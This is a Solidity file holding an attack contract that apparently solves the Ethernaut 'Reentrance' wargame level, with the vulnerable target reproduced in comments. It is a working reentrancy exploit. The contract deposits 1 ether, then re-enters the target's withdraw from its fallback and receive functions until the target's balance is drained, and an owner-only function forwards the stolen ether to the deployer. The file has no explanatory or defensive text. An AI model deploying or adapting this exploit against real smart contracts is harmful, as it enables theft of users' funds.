// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

interface IReentrance {
    function donate(address _to) external payable;

    function balanceOf(address _who) external view returns (uint256 balance);

    function withdraw(uint256 _amount) external;
}

contract ReentranceHack {
    address owner;
    IReentrance private immutable target;

    constructor(address _target) {
        owner = msg.sender;
        target = IReentrance(_target);
    }

    function perform() external payable {
        target.donate{value: 1e18}(address(this));
        target.withdraw(1e18);

        require(address(target).balance == 0, "target balance > 0");

        // selfdestruct(payable(msg.sender))
    }

    function withdraw() external {
        require(owner == msg.sender, "not owner");
        payable(owner).transfer(address(this).balance);
    }

    function min(uint256 left, uint256 right) private pure returns (uint256) {
        if (left <= right) return left;

        return right;
    }

    fallback() external payable {
        uint256 amount = min(1e18, address(target).balance);
        if (amount > 0) {
            target.withdraw(amount);
        }
    }

    receive() external payable {
        uint256 amount = min(1e18, address(target).balance);
        if (amount > 0) {
            target.withdraw(amount);
        }
    }
}

// contract Reentrance {
//     using SafeMath for uint256;
//     mapping(address => uint256) public balances;

//     function donate(address _to) public payable {
//         balances[_to] = balances[_to].add(msg.value);
//     }

//     function balanceOf(address _who) public view returns (uint256 balance) {
//         return balances[_who];
//     }

//     function withdraw(uint256 _amount) public {
//         if (balances[msg.sender] >= _amount) {
//             (bool result, ) = msg.sender.call{value: _amount}("");
//             if (result) {
//                 _amount;
//             }
//             balances[msg.sender] -= _amount;
//         }
//     }

//     receive() external payable {}
// }
